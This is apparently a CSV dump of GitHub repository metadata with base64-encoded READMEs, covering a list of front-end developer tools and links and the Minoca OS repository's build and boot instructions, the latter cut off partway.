name,id,description,language,open_issues,stargazers_count,topics,watchers,fork,forks_url,readme,config,travis0,travis1,travis2,travis3,travis4,travis5,travis6,travis7,travis8,travis9,travis10,travis11,travis12,travis13,travis14,travis15,travis16,travis17,travis18,travis19,travis20,travis21,travis22,travis23,gitlab0,gitlab1,gitlab2,gitlab3,gitlab4,gitlab5,gitlab6,gitlab7,gitlab8,gitlab9,gitlab10,gitlab11,gitlab12,gitlab13,gitlab14,gitlab15,gitlab16,gitlab17,gitlab18,gitlab19,gitlab20,gitlab21,gitlab22,gitlab23,jenkinsPipeline0,jenkinsPipeline1,jenkinsPipeline2,jenkinsPipeline3,jenkinsPipeline4,jenkinsPipeline5,jenkinsPipeline6,jenkinsPipeline7,jenkinsPipeline8,jenkinsPipeline9,jenkinsPipeline10,jenkinsPipeline11,jenkinsPipeline12,jenkinsPipeline13,jenkinsPipeline14,jenkinsPipeline15,jenkinsPipeline16,jenkinsPipeline17,jenkinsPipeline18,jenkinsPipeline19,jenkinsPipeline20,jenkinsPipeline21,jenkinsPipeline22,jenkinsPipeline23,cirrus0,cirrus1,cirrus2,cirrus3,cirrus4,cirrus5,cirrus6,cirrus7,cirrus8,cirrus9,cirrus10,cirrus11,cirrus12,cirrus13,cirrus14,cirrus15,cirrus16,cirrus17,cirrus18,cirrus19,cirrus20,cirrus21,cirrus22,cirrus23,github0,github1,github2,github3,github4,github5,github6,github7,github8,github9,github10,github11,github12,github13,github14,github15,github16,github17,github18,github19,github20,github21,github22,github23,cds0,cds1,cds2,cds3,cds4,cds5,cds6,cds7,cds8,cds9,cds10,cds11,cds12,cds13,cds14,cds15,cds16,cds17,cds18,cds19,cds20,cds21,cds22,cds23,azure0,azure1,azure2,azure3,azure4,azure5,azure6,azure7,azure8,azure9,azure10,azure11,azure12,azure13,azure14,azure15,azure16,azure17,azure18,azure19,azure20,azure21,azure22,azure23,circleci0,circleci1,circleci2,circleci3,circleci4,circleci5,circleci6,circleci7,circleci8,circleci9,circleci10,circleci11,circleci12,circleci13,circleci14,circleci15,circleci16,circleci17,circleci18,circleci19,circleci20,circleci21,circleci22,circleci23,bitbucket0,bitbucket1,bitbucket2,bitbucket3,bitbucket4,bitbucket5,bitbucket6,bitbucket7,bitbucket8,bitbucket9,bitbucket10,bitbucket11,bitbucket12,bitbucket13,bitbucket14,bitbucket15,bitbucket16,bitbucket17,bitbucket18,bitbucket19,bitbucket20,bitbucket21,bitbucket22,bitbucket23
KQoqIFtSZWdleFBsYW5ldF0oaHR0cDovL3d3dy5yZWdleHBsYW5ldC5jb20v
KQoKIyMjIyMjSFRNTC9DU1MgZWRpdG9ycwoqIFtkYWJibGV0XShodHRwOi8v
ZGFiYmxldC5jb20vKQoqIFtjc3NkZXNrXShodHRwOi8vY3NzZGVzay5jb20v
KQoKIyMjIyMjSFRNTC9DU1MvSlMgZWRpdG9ycwoqIFt0aW5rZXIuaW9dKGh0
dHBzOi8vdGlua2VyLmlvLykKKiBbdGlua2VyYmluXShodHRwOi8vdGlua2Vy
YmluLmNvbS8pCiogW1BsdW5rZXJdKGh0dHBzOi8vZ2l0aHViLmNvbS9maWxl
YXJ0cy9wbHVua2VyKQoqIFtjc3NkZWNrXShodHRwOi8vY3NzZGVjay5jb20v
KQoqIFtjb2RlcGVuXShodHRwOi8vY29kZXBlbi5pby8pCiogW2xpdmV3ZWF2
ZV0oaHR0cDovL2xpdmV3ZWF2ZS5jb20vKQoqIFtjb2RlbWFnaWMuZ3JdKGh0
dHA6Ly9jb2RlbWFnaWMuZ3IvKQoKIyMjIyMjRXhlY3V0ZS9UZXN0IGxpdmUg
Y29kZQoqIFtydW5uYWJsZV0oaHR0cDovL3J1bm5hYmxlLmNvbS8pCgojIyMj
IyNCcm93c2VyIElERSdzCiogW2tvZGluZ10oaHR0cHM6Ly9rb2RpbmcuY29t
LykKKiBbY2xvdWQ5IElERV0oaHR0cHM6Ly9jOS5pby8pCiogW2FjdGlvbi5p
b10oaHR0cHM6Ly93d3cuYWN0aW9uLmlvKQoKIyMjIyMjSlNPTiBlZGl0b3Jz
CiogW2pzb25lZGl0b3JvbmxpbmUub3JnXShodHRwOi8vanNvbmVkaXRvcm9u
bGluZS5vcmcvKQoqIFtKU09OIFRpbmtlcl0oaHR0cDovL2pzb24uYnViYmxl
bWl4Lm5ldC8pCiogW0pTT05tYXRdKGh0dHA6Ly9qc29ubWF0ZS5jb20vKQoK
IyNCcm93c2VyIFNlY3VyaXR5CgoqIFtCcm93c2VyIFNlY3VyaXR5IEhhbmRi
b29rXShodHRwOi8vY29kZS5nb29nbGUuY29tL3AvYnJvd3NlcnNlYy93aWtp
L01haW4pCiogW0RPTVB1cmlmeV0oaHR0cHM6Ly9naXRodWIuY29tL2N1cmU1
My9ET01QdXJpZnkpCiogW2h0bWw1c2VjLm9yZ10oaHR0cHM6Ly9odG1sNXNl
Yy5vcmcvKQoqIFtqcy14c3NdKGh0dHBzOi8vZ2l0aHViLmNvbS9sZWl6b25n
bWluL2pzLXhzcykKCiMjQnJvd3NlciBIYWNrcwoKKiBbYnJvd3NlcmhhY2tz
LmNvbV0oaHR0cDovL3d3dy5icm93c2VyaGFja3MuY29tLykKCgojI0FQSSBm
aXJzdCwgQ01TIFNlcnZpY2UKCiogW2NvbnRlbnRmdWxdKGh0dHBzOi8vd3d3
LmNvbnRlbnRmdWwuY29tKQoqIFtwcmlzbWljLmlvXShodHRwczovL3ByaXNt
aWMuaW8pCgoKIyNCYWNrZW5kIHNlcnZpY2VzIGZvciBmcm9udC1lbmQgZGV2
ZWxvcGVycwoKKiBbZmlyZWJhc2VdKGh0dHBzOi8vd3d3LmZpcmViYXNlLmNv
bS9pbmRleC5odG1sKQoqIFtwdXNoZXJdKGh0dHA6Ly9wdXNoZXIuY29tLykK
KiBbamF5c3RhY2tdKGh0dHA6Ly9qYXlzdGFjay5jb20vKQoqIFtwYXJzZV0o
aHR0cHM6Ly93d3cucGFyc2UuY29tKQoqIFtzaW5nbHldKGh0dHBzOi8vc2lu
Z2x5LmNvbS8pCiogW2Nsb3VkIENNU10oaHR0cHM6Ly93d3cuY2xvdWRjbXMu
Y29tLykKKiBba2ludmV5XShodHRwOi8vd3d3LmtpbnZleS5jb20vKQoqIFtz
dGFja21vYl0oaHR0cDovL3d3dy5zdGFja21vYi5jb20vKQoqIFtjbG91ZG1p
bmVdKGh0dHBzOi8vY2xvdWRtaW5lLm1lLykKKiBba3VtdWxvc10oaHR0cDov
L3d3dy5rdW11bG9zLmNvbS8pCiogW2RlcGxveWRdKGh0dHA6Ly9kZXBsb3lk
LmNvbS8pCiogW2JhY2tsaWZ0LmNvbV0oaHR0cHM6Ly9iYWNrbGlmdC5jb20v
aW5kZXguaHRtbCkKKiBbaHVsbC5pb10oaHR0cDovL2h1bGwuaW8vKQoqIFtz
dG9ybXBhdGguY29tXShodHRwOi8vc3Rvcm1wYXRoLmNvbS8pCiogW2RyZWFt
ZmFjdG9yeV0oaHR0cHM6Ly93d3cuZHJlYW1mYWN0b3J5LmNvbS8pCiogW3Vz
ZXJhcHAuaV0oaHR0cHM6Ly93d3cudXNlcmFwcC5pby8pCiogW2dvaW5zdGFu
dF0oaHR0cHM6Ly9nb2luc3RhbnQuY29tLykKKiBbbXlqc29uLmNvbV0oaHR0
cDovL215anNvbi5jb20vKQoKIyNBUEkgdG9vbHMKCiogW2FwaWFyeV0oaHR0
cDovL2FwaWFyeS5pby8pCiogW2FwaSBlbmdpbmVdKGh0dHBzOi8vYXBpZW5n
aW5lLmlvLykKKiBbU3dhZ2dlcl0oaHR0cHM6Ly9kZXZlbG9wZXJzLmhlbGxv
cmV2ZXJiLmNvbS9zd2FnZ2VyLykKKiBbcG9zdG1hbl0oaHR0cDovL3d3dy5n
ZXRwb3N0bWFuLmNvbS8pCiogW2FwaWRvY2pzXShodHRwOi8vYXBpZG9janMu
Y29tLykKKiBbYXBpYmx1ZXByaW50XShodHRwOi8vYXBpYmx1ZXByaW50Lm9y
Zy8pCgojI0FQSSBNb2NraW5nCgoqIFttb2NreS5pb10oaHR0cDovL3d3dy5t
b2NreS5pby8pCiogW0ZpbGxUZXh0LmNvbV0oaHR0cDovL3d3dy5maWxsdGV4
dC5jb20vKQoqIFtKU09OUGxhY2Vob2xkZXJdKGh0dHA6Ly9qc29ucGxhY2Vo
b2xkZXIudHlwaWNvZGUuY29tLykKKiBbZmFrZXIuanNdKGh0dHBzOi8vZ2l0
aHViLmNvbS9NYXJhay9GYWtlci5qcykKKiBbanNvbi1nZW5lcmF0b3JdKGh0
dHA6Ly93d3cuanNvbi1nZW5lcmF0b3IuY29tKQoqIFtjYWRkaXNdKGh0dHBz
Oi8vZ2l0aHViLmNvbS9idXN0YXJkY2VsbHkvY2FkZGlzKQoqIFtkeXNvbl0o
aHR0cHM6Ly9naXRodWIuY29tL3dlYnByby9keXNvbikKKiBbanNvbi1zZXJ2
ZXJdKGh0dHBzOi8vZ2l0aHViLmNvbS90eXBpY29kZS9qc29uLXNlcnZlcikK
CiMjSW1hZ2UgTW9ja2luZwoKKiBbcGxhY2VraXR0ZW5dKGh0dHA6Ly9wbGFj
ZWtpdHRlbi5jb20vKQoqIFtQTEFDRUhPTEQuSVRdKGh0dHA6Ly9wbGFjZWhv
bGQuaXQvKQoqIFtoaGhob2xkLmNvbV0oaHR0cDovL2hoaGhvbGQuY29tLykK
CiMjSlNPTiBRdWVyeSBUb29scwoKKiBbVGFmZnlEQl0oaHR0cDovL3d3dy50
YWZmeWRiLmNvbS8pCiogW2xpbnEuanNdKGh0dHA6Ly9saW5xanMuY29kZXBs
ZXguY29tLykKKiBbanNvbjpzZWxlY3QoKV0oaHR0cDovL2pzb25zZWxlY3Qu
b3JnLykKKiBbSlNPTmlxXShodHRwOi8vd3d3Lmpzb25pcS5vcmcvKQoqIFtq
c29uLXF1ZXJ5XShodHRwczovL2dpdGh1Yi5jb20vbW1ja2VnZy9qc29uLXF1
ZXJ5KQoqIFtTcGFoUUxdKGh0dHA6Ly9kYW5za2kuZ2l0aHViLmlvL3NwYWhx
bC8pCiogW2pzb24tbWFza10oaHR0cHM6Ly9naXRodWIuY29tL25lbXRzb3Yv
anNvbi1tYXNrKQoqIFtvYmplcV0oaHR0cHM6Ly9naXRodWIuY29tL2FnaWxv
c29mdHdhcmUvb2JqZXEpCgojI0pTT04gVmFsaWRhdGlvbiBUb29scwoKKiBb
U0NIRU1BLUlOU1BFQ1RPUl0oaHR0cDovL2F0aW51eC5naXRodWIuaW8vc2No
ZW1hLWluc3BlY3Rvci8pCgoKIyNGcm9udC1lbmQgREIncwoKKiBbcG91Y2hk
Yl0oaHR0cDovL3BvdWNoZGIuY29tLykKKiBbV2ViIFN0b3JhZ2VdKGh0dHA6
Ly93d3cudzMub3JnL1RSL3dlYnN0b3JhZ2UvKQoqIFtJbmRleGVkIERhdGFi
YXNlIEFQSV0oaHR0cDovL3d3dy53My5vcmcvVFIvSW5kZXhlZERCLykKKiBb
bG9raUpTXShodHRwOi8vbG9raWpzLm9yZy8pCiogW3VuZGVyc2NvcmUuZGJd
KGh0dHBzOi8vZ2l0aHViLmNvbS90eXBpY29kZS91bmRlcnNjb3JlLmRiKQoq
IFtCYXNlZCBKU10oaHR0cHM6Ly9naXRodWIuY29tL1RyZW1heW5lQ2hyaXN0
L0Jhc2VkKQoKIyNDYXRhbG9nL0NvbGxlY3Rpb24gb2YgSmF2YVNjcmlwdCBM
aWJzIGFuZCBUb29scwoKKiBbanN0ZXJdKGh0dHA6Ly9qc3Rlci5uZXQvKQoq
IFt0aGV0b29sYm94LmNjXShodHRwOi8vdGhldG9vbGJveC5jYy8pCiogW2ph
dmFzY3JpcHRvby5jb21dKGh0dHA6Ly93d3cuamF2YXNjcmlwdG9vLmNvbS8p
CiogW21pY3JvanMuY29tXShodHRwOi8vbWljcm9qcy5jb20vKQoqIFtKU0RC
LklPXShodHRwOi8vd3d3LmpzZGIuaW8vP3NvcnQ9dHJlbmRpbmcpCgoKIyNT
dGF0aWMgU2l0ZSBHZW5lcmF0b3JzCgoqIFtodHRwOi8vc3RhdGljc2l0ZWdl
bmVyYXRvcnMubmV0L10oaHR0cDovL3N0YXRpY3NpdGVnZW5lcmF0b3JzLm5l
dC8pCg==
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'os',72385590,b'Minoca operating system',b'C',20,2385,,2385,False,b'https://api.github.com/repos/minoca/os/forks',"IyBNaW5vY2EgT1MKCk1pbm9jYSBPUyBpcyBhIGdlbmVyYWwgcHVycG9zZSBv
cGVyYXRpbmcgc3lzdGVtIHdyaXR0ZW4gZnJvbSBzY3JhdGNoLiBJdCBhaW1z
IHRvIGJlIGxlYW4sIG1haW50YWluYWJsZSwgbW9kdWxhciwgYW5kIGNvbXBh
dGlibGUgd2l0aCBleGlzdGluZyBzb2Z0d2FyZS4gSXQgZmVhdHVyZXMgYSBQ
T1NJWC1saWtlIGludGVyZmFjZSB0b3dhcmRzIGFwcGxpY2F0aW9uIHNvZnR3
YXJlLCBhbmQgYSBncm93aW5nIHN1aXRlIG9mIHBvcHVsYXIgcGFja2FnZXMg
YWxyZWFkeSBidWlsdCBhbmQgcmVhZHkgdG8gZ28uIE9uIHRoZSBiYWNrZW5k
LCBpdCBjb250YWlucyBhIHBvd2VyZnVsIGRyaXZlciBtb2RlbCBiZXR3ZWVu
IGRldmljZSBkcml2ZXJzIGFuZCB0aGUga2VybmVsLiBUaGUgZHJpdmVyIG1v
ZGVsIGVuYWJsZXMgZHJpdmVycyB0byBiZSB3cml0dGVuIGluIGEgZm9yd2Fy
ZCBjb21wYXRpYmxlIG1hbm5lciwgc28gdGhhdCBrZXJuZWwgbGV2ZWwgY29t
cG9uZW50cyBjYW4gYmUgdXBncmFkZWQgd2l0aG91dCBuZWNlc3NhcmlseSBy
ZXF1aXJpbmcgYSByZWNvbXBpbGF0aW9uIG9mIGFsbCBkZXZpY2UgZHJpdmVy
cy4KCk1pbm9jYSBPUyBpcyBldmVudCBkcml2ZW4sIHByZWVtcHRpYmxlLCBT
TVAgcmVhZHksIGFuZCBuZXR3b3JrIGNhcGFibGUuIEl0IGN1cnJlbnRseSBy
dW5zIG9uIHg4NiBQQ3MgYW5kIGEgcmFuZ2Ugb2YgQVJNIGJvYXJkcy4KCiMj
IyBTY3JlZW5zaG90cwohW0luc3RhbGxpbmcgR2l0IG9uIE1pbm9jYSBPU10o
ZG9jcy9zY3JlZW5zaG90cy9JbnN0YWxsaW5nLUdpdC5wbmcpCiFbTWVtb3J5
IFByb2ZpbGVyXShkb2NzL3NjcmVlbnNob3RzL01lbW9yeS1Qcm9maWxlci5w
bmcpCiFbU3RhY2sgUHJvZmlsZXJdKGRvY3Mvc2NyZWVuc2hvdHMvU3RhY2st
UHJvZmlsZXIucG5nKQoKIyMjIEdldHRpbmcgU3RhcnRlZApJZiB5b3UncmUg
anVzdCBsb29raW5nIHRvIHRyeSBvdXQgTWlub2NhIE9TLCBoZWFkIG92ZXIg
dG8gb3VyIFtkb3dubG9hZF0oaHR0cHM6Ly93d3cubWlub2NhY29ycC5jb20v
ZG93bmxvYWQvKSBwYWdlIHRvIGdyYWIgdGhlIGxhdGVzdCBzdGFibGUgaW1h
Z2VzLiBUaGUgcmVzdCBvZiB0aGlzIHBhZ2UgZGVzY3JpYmVzIGhvdyB0byB1
c2UgdGhpcyByZXBvc2l0b3J5IHRvIGJ1aWxkIHlvdXIgb3duIGN1c3RvbSBp
bWFnZSBvZiBNaW5vY2EgT1MuCgojIyBCdWlsZGluZyBNaW5vY2EgT1MKVGhl
IHBhcmFncmFwaHMgYmVsb3cgd2lsbCBnZXQgeW91IGZyb20gYSBmcmVzaCBj
bG9uZSB0byBhIGJ1aWx0IGltYWdlLgoKIyMjIEVudmlyb25tZW50ClRoZSBN
aW5vY2EgT1MgYnVpbGQgZW52aXJvbm1lbnQgaXMga2V5ZWQgb2ZmIG9mIGEg
ZmV3IGVudmlyb25tZW50IHZhcmlhYmxlcyB5b3UnbGwgbmVlZCB0byBzZXQg
aW4gb3JkZXIgdG8gb3JpZW50IHRoZSBidWlsZCBzeXN0ZW06CiAtIGBTUkNS
T09UYCAtIENvbnRhaW5zIHRoZSBhYnNvbHV0ZSBwYXRoIHRvIHRoZSBiYXNl
IHNvdXJjZSBkaXJlY3RvcnkuIFRoaXMgcmVzcG9zaXRvcnkgaXMgZXhwZWN0
ZWQgdG8gYmUgaW4gYSBkaXJlY3RvcnkgY2FsbGVkIGBvc2AgaW5zaWRlIGBT
UkNST09UYC4gSWYgdGhlIHRoaXJkLXBhcnR5IG9yIHRvb2xzIHJlcG9zaXRv
cmllcyBhcmUgcHJlc2VudCwgdGhleSBzaG91bGQgYmUgaW4gZGlyZWN0b3Jp
ZXMgY2FsbGVkIGB0aGlyZC1wYXJ0eWAgYW5kIGB0b29sc2AgcmVzcGVjdGl2
ZWx5IHVuZGVybmVhdGggYFNSQ1JPT1RgLiBGb3IgZXhhbXBsZSwgaWYgeW91
IGhhZCBjaGVja2VkIG91dCB0aGlzIHJlcG9zaXRvcnkgaW50byBgfi9zcmMv
b3NgLCB0aGVuIGluIHlvdXIgc2hlbGwgeW91J2QgcnVuIGBleHBvcnQgU1JD
Uk9PVD1+L3NyY2AuCiAtIGBBUkNIYCAtIENvbnRhaW5zIHRoZSBhcmNoaXRl
Y3R1cmUgdG8gYnVpbGQgTWlub2NhIE9TIGZvciAoYWthIHRoZSB0YXJnZXQg
YXJjaGl0ZWN0dXJlKS4gVmFsaWQgdmFsdWVzIGFyZSBgYXJtdjZgLCBgYXJt
djdgLCBhbmQgYHg4NmAuCiAtIGBWQVJJQU5UYCAtIENvbnRhaW5zIHRoZSBh
cmNoaXRlY3R1cmUgdmFyaWFudCwgaWYgYW55LiBMZWF2ZSB0aGlzIHVuc2V0
IG1vc3Qgb2YgdGhlIHRpbWUuIEN1cnJlbnRseSB0aGUgb25seSB2YWxpZCB2
YWx1ZSBpcyBgcWAgZm9yIHRoZSBgeDg2YCBhcmNoaXRlY3R1cmUsIHdoaWNo
IGJ1aWxkcyBmb3IgdGhlIEludGVsIFF1YXJrLgogLSBgREVCVUdgIC0gRGVz
Y3JpYmVzIHdoZXRoZXIgdG8gYnVpbGQgTWlub2NhIE9TIGZvciBkZWJ1Z2dp
bmcgb3IgcmVsZWFzZS4gVmFsaWQgdmFsdWVzIGFyZSBgZGJnYCBmb3IgZGVi
dWcgb3IgYHJlbGAgZm9yIHJlbGVhc2UuIFdlIGFsd2F5cyBidWlsZCBgZGJn
YC4KIC0gYFBBVEhgIC0gWW91J2xsIG5lZWQgdG8gaGF2ZSBgJFNSQ1JPT1Qv
JEFSQ0gkVkFSSUFOVCRERUJVRy90b29scy9iaW5gIGluIHlvdXIgcGF0aCB0
byBidWlsZCBzdWNjZXNzZnVsbHkuCgojIyMgUHJlcmVxdWlzaXRlcwpUbyBi
dWlsZCBNaW5vY2EgT1MgeW91J2xsIG5lZWQgYSBNaW5vY2Etc3BlY2lmaWMg
dG9vbGNoYWluIGZvciB0aGUgcGFydGljdWxhciBhcmNoaXRlY3R1cmUgeW91
J3JlIGJ1aWxkaW5nLiBQcmVidWlsdCB0b29sY2hhaW5zIGNhbiBiZSBmb3Vu
ZCBbaGVyZV0oaHR0cHM6Ly93d3cubWlub2NhY29ycC5jb20vZG93bmxvYWQv
I3Rvb2xjaGFpbikuIElmIHlvdSB3YW50IHRvIGJ1aWxkIHRoZSB0b29sY2hh
aW4gZnJvbSBzb3VyY2VzLCB5b3UnbGwgbmVlZCB0byBjaGVjayBvdXQgdGhl
IFt0aGlyZC1wYXJ0eV0oaHR0cHM6Ly9naXRsYWIuY29tL21pbm9jYS90aGly
ZC1wYXJ0eSkgcmVwb3NpdG9yeSBhbmQgcnVuICJtYWtlIHRvb2xzIiBpbiB0
aGVyZS4KPiBOb3RlOiBJZiB5b3Ugd2FudCB0byBidWlsZCB5b3VyIG93biB0
b29sY2hhaW4gb24gV2luZG93cywgeW91IG1heSBmaW5kIHRoZSBbdG9vbHNd
KGh0dHBzOi8vZ2l0bGFiLmNvbS9taW5vY2EvdG9vbHMpIHJlcG9zaXRvcnkg
aGVscGZ1bCwgYXMgaXQgY29udGFpbnMgYSBuYXRpdmUgTWluR1cgY29tcGls
ZXIsIG1ha2UsIGFuZCBvdGhlciB0b29scyBuZWVkZWQgdG8gYm9vdHN0cmFw
IGEgdG9vbGNoYWluIG9uIFdpbmRvd3MuCgojIyMgQnVpbGQKUnVuIGBtYWtl
YCB0byBidWlsZCB0aGUgT1MgZm9yIHRoZSBwYXJ0aWN1bGFyIGFyY2hpdGVj
dHVyZSB5b3UndmUgc3VwcGxpZWQuIFBhcmFsbGVsIG1ha2UgaXMgc3VwcG9y
dGVkLiBUaGUgZmluYWwgb3V0cHV0IG9mIHRoZSBidWlsZCB3aWxsIGJlIHNl
dmVyYWwgLmltZyBmaWxlcyBsb2NhdGVkIGluIGAkU1JDUk9PVC8kQVJDSCRW
QVJJQU5UJERFQlVHL2Jpbi8qLmltZ2AuIEZvciBleGFtcGxlLCB0aGUgUEMg
aW1hZ2UgaXMgdXN1YWxseSBsb2NhdGVkIGF0IGAkU1JDUk9PVC94ODZkYmcv
YmluL3BjLmltZ2AuIFRoaXMgaXMgYSByYXcgaGFyZCBkaXNrIGZpbGUgdGhh
dCBjYW4gYmUgYXBwbGllZCBkaXJlY3RseSB0byBhIGhhcmQgZHJpdmUgb3Ig
VVNCIHN0aWNrIHRvIGJvb3QgTWlub2NhIE9TLiBUaGUgaW1hZ2UgYGluc3Rh
bGwuaW1nYCBpcyBhIGdlbmVyaWMgaW5zdGFsbGF0aW9uIGFyY2hpdmUgdGhh
dCB0aGUgYG1zZXR1cGAgdG9vbCBjYW4gdXNlIHRvIGNyZWF0ZSBuZXcgTWlu
b2NhIE9TIGluc3RhbGxhdGlvbnMgb24gdGFyZ2V0IGRpc2tzIG9yIHBhcnRp
dGlvbnMuCgpPYmplY3QgZmlsZXMgYXJlIGdlbmVyYXRlZCBpbiBgJFNSQ1JP
T1QvJEFSQ0gkVkFSSUFOVCRERUJVRy9vYmovb3NgLiBZb3UgY2FuIHJ1biBg
bWFrZSBjbGVhbmAsIG9yIHNpbXBseSBkZWxldGUgdGhpcyBkaXJlY3Rvcnks
IHRvIGNhdXNlIHRoZSBvcyByZXBvc2l0b3J5IHRvIGNvbXBsZXRlbHkgcmVi
dWlsZC4gQWx0ZXJuYXRpdmVseSwgeW91IGNhbiBydW4gYG1ha2Ugd2lwZWAg
dG8gZGVsZXRlIGFsbCBnZW5lcmF0ZWQgZmlsZXMsIGluY2x1ZGluZyB0aGUg
dGhpcmQtcGFydHkgdG9vbHMgeW91IGJ1aWx0IG9yIGRvd25sb2FkZWQuIFJ1
bm5pbmcgYG1ha2Ugd2lwZWAgc2ltcGx5IGRlbGV0ZXMgYCRTUkNST09ULyRB
UkNIJFZBUklBTlQkREVCVUcvYC4gV2UgdXN1YWxseSBzdGljayB0byBgbWFr
ZSBjbGVhbmAgc2luY2UgYG1ha2Ugd2lwZWAgcmVxdWlyZXMgYSBjb21wbGV0
ZSByZWJ1aWxkIG9mIHRoZSB0b29sY2hhaW4uCgpBIG5vdGUgZm9yIG1hY09T
IHVzZXJzOiBXZSd2ZSBtYW5hZ2VkIHRvIGJ1aWxkIHN1Y2Nlc3NmdWxseSB1
c2luZyBib3RoIEdDQyBmcm9tIFhDb2RlIDggKHJlYWxseSBjbGFuZykgYW5k
IEhvbWVicmV3IEdDQywgYm90aCB1c2luZyB0aGUgMTAuMTIgU0RLLiBTb21l
IHVzZXJzIGhhdmUgcmVwb3J0ZWQgdGhhdCB0aGV5IG5lZWQgdG8gZXhwb3J0
IGBTREtST09UPSQoeGNydW4gLS1zaG93LXNkay1wYXRoKWAgdG8gYnVpbGQg
cHJvcGVybHkuCgojIyMgUnVubmluZwpUbyBib290IHlvdXIgYnVpbHQgaW1h
Z2VzLCB5b3UgY2FuIHdyaXRlIHRoZSBhcHByb3ByaWF0ZSBpbWFnZSBmb3Ig
dGhlIHBsYXRmb3JtIHlvdSdyZSB0cnlpbmcgdG8gYm9vdCB0byBhIFVTQiBm
bGFzaCBkcml2ZSBvciBoYXJkIGRpc2suIE9uIFdpbmRvd3MsIHlvdSBjYW4g
dXNlIHRoZSBXaW4zMkRpc2tJbWFnZXIgdG9vbCAoaW5jbHVkZWQgaW4gdGhl
IFt0b29sc10oaHR0cHM6Ly9naXRsYWIuY29tL21pbm9jYS90b29scykgcmVw
b3NpdG9yeSB1bmRlciB3aW4zMi9XaW4zMkRpc2tJbWFnZXIpLiBZb3UgY2Fu
IGFsc28gdXNlIHRoZSBtc2V0dXAgdG9vbCB0byBidWlsZCBjdXN0b20gaW1h
Z2VzLiBJZiB5b3UgdXNlIHRoZSBtc2V0dXAgdG9vbCB0byBpbnN0YWxsIE1p
bm9jYSBPUyBvbnRvIGEgcGFydGl0aW9uIG9mIGEgZGlzayBjb250YWluaW5n
IG90aGVyIHBhcnRpdGlvbnMgdGhhdCB5b3UgY2FyZSBhYm91dCAoc3VjaCBh
cyBvbiB0aGUgc2FtZSBtYWNoaW5lIHlvdSdyZSBidWlsZGluZyBmcm9tKSwg
d2UgaGlnaGx5IHJlY29tbWVuZCBtYWtpbmcgYSBjb21wbGV0ZSBiYWNrdXAg
b2YgeW91ciBkaXNrLiBNaW5vY2EgT1MgaXMgc3RpbGwgbmV3LCBhbmQgd2Ug
d291bGRuJ3Qgd2FudCBhIGJhZCBidWcgdG8gd2lwZSBvdXQgYWxsIHlvdXIg
ZGF0YS4KCklmIHlvdSdyZSBidWlsZGluZyBNaW5vY2EgT1Mgb24gV2luZG93
cyBhbmQgaGF2ZSBkb3dubG9hZGVkIHRoZSBbdG9vbHNdKGh0dHBzOi8vZ2l0
bGFiLmNvbS9taW5vY2EvdG9vbHMpIHJlcG9zaXRvcnksIHNldmVyYWwgc2hv
cnRjdXRzIGhhdmUgYmVlbiBzZXQgdXAgdG8gYWxsb3cgeW91IHRvIHF1aWNr
bHkgcnVuIGEgUWVtdSBpbnN0YW5jZSB3aXRoIHRoZSBpbWFnZXMgeW91J3Zl
IGp1c3QgYnVpbHQuIE1ha2Ugc3VyZSB5b3UgZmlyZWQgdXAgdGhlIGRldmVs
b3BtZW50IGVudmlyb25tZW50IHdpdGggdGhlIHNldGVudi5jbWQgc2NyaXB0
LiBUeXBlIGBydW5gLCB0aGVuIGBkeGAgdG8gZmlyZSB1cCBhbiB4ODYgUWVt
dSBpbnN0YW5jZSBvZiBwYy5pbWcgd2l0aCBhIGtlcm5lbCBkZWJ1Z2dlciBh
dHRhY2hlZC4gV2UgdXNlIHRoaXMgaW50ZXJuYWxseSBmb3IgZmFzdGVyIGRl
dmVsb3BtZW50LiBJZiBidWlsZGluZyBmb3IgQVJNLCBpdCdzIGBydW5hcm1g
IGFuZCBgZGFgLgoKIyMjIE5pY2tlbCBUb3VyCkJlbG93IGlzIGEgYnJpZWYg
b3JpZW50YXRpb24gb2YgYSBmZXcgb2YgdGhlIGRpcmVjdG9yaWVzIGluIHRo
ZSByZXBvc2l0b3J5LiBDaGVjayB0aGUgTWFrZWZpbGUgaW4gZWFjaCBkaXJl
Y3RvcnkgZm9yIGEgbW9yZSBkZXRhaWxlZCBkZXNjcmlwdGlvbiBvZiB3aGF0
IHRoYXQgZGlyZWN0b3J5IGNvbnRhaW5zLgogKiBgYXBwc2AgLSBVc2VyIG1v
ZGUgYXBwbGljYXRpb25zIGFuZCBsaWJyYXJpZXMKICAgKiBgY2tgIC0gQ2hh
bGssIGFuIGVtYmVkZGFibGUgc2NyaXB0aW5nIGxhbmd1YWdlCiAgICogYGRl
YnVnYCAtIERlYnVnZ2VyIGFwcGxpY2F0aW9uCiAgICogYGxpYmNgIC0gVGhl
IE1pbm9jYSBPUyBDIExpYnJhcnkKICAgKiBgb3NiYXNlYCAtIFRoZSBNaW5v
Y2Ega2VybmVsIEFQSSBsaWJyYXJ5CiAgICogYHNldHVwYCAtIFRoZSBtc2V0
dXAgYnVpbGQgdG9vbAogICAqIGBzd2lzc2AgLSBQT1NJWCB0b29scyBpbiBh
IGJveAogKiBgYm9vdGAgLSBFeGVjdXRhYmxlcyB1c2VkIGR1cmluZyBzeXN0
ZW0gYm9vdAogICAqIGBtYnJgIC0gVGhlIE1hc3RlciBCb290IFJlY29yZAog
ICAqIGBmYXRib290YCAtIFRoZSBWb2x1bWUgQm9vdCBSZWNvcmQgZm9yIEZB
VCBmaWxlIHN5c3RlbXMKICAgKiBgYm9vdG1hbmAgLSBUaGUgTWlub2NhIEJv
